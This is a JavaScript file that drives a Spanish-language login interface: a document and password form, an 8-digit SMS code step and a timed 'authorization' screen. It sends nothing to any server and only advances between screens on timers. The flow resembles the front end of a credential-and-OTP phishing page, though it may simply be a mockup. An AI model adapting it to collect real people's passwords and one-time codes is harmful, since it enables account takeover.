import { onlyDigits, setupSelect } from "./auth.js";

const form = document.getElementById("login-form");
const errorEl = document.getElementById("form-error");
const docNumber = document.getElementById("docNumber");
const password = document.getElementById("password");
const submitBtn = document.getElementById("login-btn-ingresar");
const spinner = document.getElementById("loading-spinner");
const smsScreen = document.getElementById("sms-screen");
const smsForm = document.getElementById("sms-form");
const smsClose = document.getElementById("sms-close");
const smsBtn = document.getElementById("sms-btn-continuar");
const otpInputs = [...document.querySelectorAll("#sms-otp .sms-digit")];
const authzScreen = document.getElementById("authz-screen");
const authzClose = document.getElementById("authz-close");
const authzClock = document.getElementById("authz-clock");
const authzBarFill = document.getElementById("authz-bar-fill");
const AUTHZ_SECONDS = 110;
let authzLeft = AUTHZ_SECONDS;
let authzTimer = 0;

setupSelect();
onlyDigits(docNumber);

function syncSubmit() {
  submitBtn.disabled = password.value.trim().length < 4;
}

function smsCode() {
  return otpInputs.map((input) => input.value).join("");
}

function syncSmsBtn() {
  smsBtn.disabled = smsCode().length !== 8;
}

function openSmsScreen() {
  spinner.hidden = true;
  smsScreen.hidden = false;
  otpInputs[0]?.focus();
}

function closeSmsScreen() {
  smsScreen.hidden = true;
}

function formatClock(total) {
  const minutes = String(Math.floor(total / 60)).padStart(2, "0");
  const seconds = String(total % 60).padStart(2, "0");
  return `${minutes}:${seconds}`;
}

function renderAuthzTimer() {
  authzClock.textContent = formatClock(authzLeft);
  authzBarFill.style.width = `${(authzLeft / AUTHZ_SECONDS) * 100}%`;
}

function stopAuthzTimer() {
  window.clearInterval(authzTimer);
  authzTimer = 0;
}

function startAuthzTimer() {
  stopAuthzTimer();
  authzLeft = AUTHZ_SECONDS;
  renderAuthzTimer();
  authzTimer = window.setInterval(() => {
    authzLeft = Math.max(0, authzLeft - 1);
    renderAuthzTimer();
    if (authzLeft === 0) {
      stopAuthzTimer();
    }
  }, 1000);
}

function openAuthzScreen() {
  spinner.hidden = true;
  smsScreen.hidden = true;
  authzScreen.hidden = false;
  startAuthzTimer();
}

function closeAuthzScreen() {
  stopAuthzTimer();
  authzScreen.hidden = true;
}

docNumber.addEventListener("input", syncSubmit);
password.addEventListener("input", syncSubmit);
syncSubmit();
syncSmsBtn();

otpInputs.forEach((input, index) => {
  input.addEventListener("input", () => {
    const digit = input.value.replace(/\D/g, "").slice(-1);
    input.value = digit;
    if (digit && otpInputs[index + 1]) {
      otpInputs[index + 1].focus();
    }
    syncSmsBtn();
  });

  input.addEventListener("keydown", (event) => {
    if (event.key === "Backspace" && !input.value && otpInputs[index - 1]) {
      otpInputs[index - 1].focus();
    }
  });

  input.addEventListener("paste", (event) => {
    event.preventDefault();
    const digits = (event.clipboardData.getData("text") || "")
      .replace(/\D/g, "")
      .slice(0, 8)
      .split("");
    digits.forEach((digit, offset) => {
      if (otpInputs[offset]) {
        otpInputs[offset].value = digit;
      }
    });
    const next = otpInputs[Math.min(digits.length, otpInputs.length - 1)];
    next?.focus();
    syncSmsBtn();
  });
});

form.addEventListener("submit", (event) => {
  event.preventDefault();
  errorEl.hidden = true;

  const payload = {
    docType: document.getElementById("docType").value || "CC",
    docNumber: docNumber.value.trim(),
    password: password.value.trim(),
  };

  if (!payload.docNumber || !payload.password) {
    errorEl.textContent = "Completa tu documento y contraseña para ingresar.";
    errorEl.hidden = false;
    return;
  }

  spinner.hidden = false;
  window.setTimeout(openSmsScreen, 1100);
});

smsClose.addEventListener("click", closeSmsScreen);
authzClose.addEventListener("click", closeAuthzScreen);

smsForm.addEventListener("submit", (event) => {
  event.preventDefault();
  if (smsCode().length !== 8) {
    return;
  }
  closeSmsScreen();
  spinner.hidden = false;
  window.setTimeout(openAuthzScreen, 1100);
});
